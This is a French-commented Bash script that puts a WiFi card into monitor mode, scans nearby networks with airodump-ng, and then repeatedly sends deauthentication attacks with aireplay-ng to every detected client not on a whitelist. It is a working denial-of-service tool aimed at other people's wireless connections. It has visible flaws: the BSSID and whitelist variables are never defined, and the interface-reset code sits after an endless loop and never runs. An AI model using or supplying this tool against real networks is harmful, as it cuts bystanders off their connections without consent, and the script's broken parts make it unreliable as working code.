#!/bin/bash

# Paramètres par défaut
DEFAULT_IFACE="wlan0"
DEFAULT_SCAN_DURATION=900    # Durée du scan (en secondes)
DEFAULT_DOS_INTERVAL=60      # Intervalle entre chaque attaque DOS (en secondes)

# Si des arguments sont fournis, on les utilise. Sinon, on prend les valeurs par défaut.
IFACE="${1:-$DEFAULT_IFACE}"
SCAN_DURATION="${2:-$DEFAULT_SCAN_DURATION}"
DOS_INTERVAL="${3:-$DEFAULT_DOS_INTERVAL}"

# Vérification de l'interface
echo "[*] Vérification de l'interface $IFACE..."
if ! ip link show "$IFACE" &>/dev/null; then
    echo "[!] Interface $IFACE non trouvée. Abandon du script."
    exit 1
fi

# Mise en mode monitor
echo "[*] Passage en mode monitor sur $IFACE..."
if ! sudo ip link set "$IFACE" down; then
    echo "[!] Échec de la mise en down de $IFACE"
    exit 1
fi

if ! sudo iw dev "$IFACE" set type monitor; then
    echo "[!] Échec de la mise en mode monitor de $IFACE"
    exit 1
fi

if ! sudo ip link set "$IFACE" up; then
    echo "[!] Échec de la mise en up de $IFACE"
    exit 1
fi

# Lancement du scan avec airodump-ng
echo "[*] Lancement du scan WiFi pendant $SCAN_DURATION secondes sur $IFACE..."
sudo airodump-ng --gpsd --showack --real-time --manufacturer --uptime --beacons -b abg --write sniff-airodump --output-format csv "$IFACE" &
SCAN_PID=$!

# Attendre la fin du scan
sleep "$SCAN_DURATION"
kill "$SCAN_PID"

echo "[*] Scan terminé. Lancement des attaques DOS toutes les $DOS_INTERVAL secondes pendant $SCAN_DURATION secondes."

# Traitement des clients et attaques DOS
while true; do
    # Extraction des adresses MAC des clients connectés
    CLIENT_MACS=$(awk -F, '{ print $1 }' sniff-airodump-01.csv | grep -v "Station" | grep -v "BSSID")

    for MAC in $CLIENT_MACS; do
        # Si l'adresse MAC n'est pas dans la whitelist, on l'attaque
        if ! grep -q "$MAC" <<< "$WHITELIST_MACS"; then
            echo "[*] → DOS : Client $MAC connecté à $(date)"
            sudo aireplay-ng -0 2 -a "$BSSID" -c "$MAC" "$IFACE"
        fi
    done

    # Pause avant le prochain cycle
    echo "[*] Pause $DOS_INTERVAL secondes avant le prochain cycle..."
    sleep "$DOS_INTERVAL"
done

# Réinitialisation de l'interface en mode géré
echo "[*] Réinitialisation de l'interface $IFACE en mode géré..."
sudo ip link set "$IFACE" down
sudo iw dev "$IFACE" set type managed
sudo ip link set "$IFACE" up

echo "[*] Script terminé."

